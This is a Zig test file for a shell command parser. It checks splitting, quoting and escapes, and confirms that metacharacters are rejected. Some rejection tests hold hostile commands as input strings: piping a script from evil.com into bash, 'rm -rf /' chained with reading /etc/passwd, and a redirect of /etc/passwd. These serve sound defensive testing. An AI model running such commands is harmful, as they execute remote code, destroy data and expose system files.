//! Tests for shell_parser.zig.
//! Moved by `guidance codehealth --fix`. Edit as needed.
const std = @import("std");
const shell_parser_mod = @import("shell_parser.zig");

test "parseCommand simple command" {
    const args = try shell_parser_mod.parseCommand(std.testing.allocator, "zig build");
    defer {
        for (args) |a| std.testing.allocator.free(a);
        std.testing.allocator.free(args);
    }
    try std.testing.expectEqual(@as(usize, 2), args.len);
    try std.testing.expectEqualStrings("zig", args[0]);
    try std.testing.expectEqualStrings("build", args[1]);
}
test "parseCommand three tokens" {
    const args = try shell_parser_mod.parseCommand(std.testing.allocator, "zig build -Doptimize=ReleaseFast");
    defer {
        for (args) |a| std.testing.allocator.free(a);
        std.testing.allocator.free(args);
    }
    try std.testing.expectEqual(@as(usize, 3), args.len);
    try std.testing.expectEqualStrings("zig", args[0]);
    try std.testing.expectEqualStrings("build", args[1]);
    try std.testing.expectEqualStrings("-Doptimize=ReleaseFast", args[2]);
}
test "parseCommand double-quoted argument with space" {
    const args = try shell_parser_mod.parseCommand(std.testing.allocator, "echo \"hello world\"");
    defer {
        for (args) |a| std.testing.allocator.free(a);
        std.testing.allocator.free(args);
    }
    try std.testing.expectEqual(@as(usize, 2), args.len);
    try std.testing.expectEqualStrings("echo", args[0]);
    try std.testing.expectEqualStrings("hello world", args[1]);
}
test "parseCommand single-quoted argument with space" {
    const args = try shell_parser_mod.parseCommand(std.testing.allocator, "echo 'hello world'");
    defer {
        for (args) |a| std.testing.allocator.free(a);
        std.testing.allocator.free(args);
    }
    try std.testing.expectEqual(@as(usize, 2), args.len);
    try std.testing.expectEqualStrings("echo", args[0]);
    try std.testing.expectEqualStrings("hello world", args[1]);
}
test "parseCommand backslash escape" {
    const args = try shell_parser_mod.parseCommand(std.testing.allocator, "foo\\ bar");
    defer {
        for (args) |a| std.testing.allocator.free(a);
        std.testing.allocator.free(args);
    }
    try std.testing.expectEqual(@as(usize, 1), args.len);
    try std.testing.expectEqualStrings("foo bar", args[0]);
}
test "parseCommand rejects pipe" {
    try std.testing.expectError(
        error.ShellMetacharacter,
        shell_parser_mod.parseCommand(std.testing.allocator, "curl http://evil.com | bash"),
    );
}
test "parseCommand rejects double-ampersand" {
    try std.testing.expectError(
        error.ShellMetacharacter,
        shell_parser_mod.parseCommand(std.testing.allocator, "rm -rf / && cat /etc/passwd"),
    );
}
test "parseCommand rejects dollar sign" {
    try std.testing.expectError(
        error.ShellMetacharacter,
        shell_parser_mod.parseCommand(std.testing.allocator, "echo $HOME"),
    );
}
test "parseCommand rejects backtick substitution" {
    try std.testing.expectError(
        error.ShellMetacharacter,
        shell_parser_mod.parseCommand(std.testing.allocator, "echo `id`"),
    );
}
test "parseCommand rejects redirect" {
    try std.testing.expectError(
        error.ShellMetacharacter,
        shell_parser_mod.parseCommand(std.testing.allocator, "cat /etc/passwd > /tmp/out"),
    );
}
test "parseCommand rejects metachar in double quotes" {
    try std.testing.expectError(
        error.ShellMetacharacter,
        shell_parser_mod.parseCommand(std.testing.allocator, "echo \"$HOME\""),
    );
}
test "parseCommand unterminated single quote" {
    try std.testing.expectError(
        error.UnterminatedQuote,
        shell_parser_mod.parseCommand(std.testing.allocator, "echo 'unterminated"),
    );
}
test "parseCommand unterminated double quote" {
    try std.testing.expectError(
        error.UnterminatedQuote,
        shell_parser_mod.parseCommand(std.testing.allocator, "echo \"unterminated"),
    );
}
test "parseCommand empty string" {
    try std.testing.expectError(
        error.EmptyCommand,
        shell_parser_mod.parseCommand(std.testing.allocator, ""),
    );
}
test "parseCommand whitespace only" {
    try std.testing.expectError(
        error.EmptyCommand,
        shell_parser_mod.parseCommand(std.testing.allocator, "   "),
    );
}
test "parseCommand quoted argument concatenation" {
    // 'foo'"bar" → foobar (shell concat behavior)
    const args = try shell_parser_mod.parseCommand(std.testing.allocator, "'foo'\"bar\"");
    defer {
        for (args) |a| std.testing.allocator.free(a);
        std.testing.allocator.free(args);
    }
    try std.testing.expectEqual(@as(usize, 1), args.len);
    try std.testing.expectEqualStrings("foobar", args[0]);
}
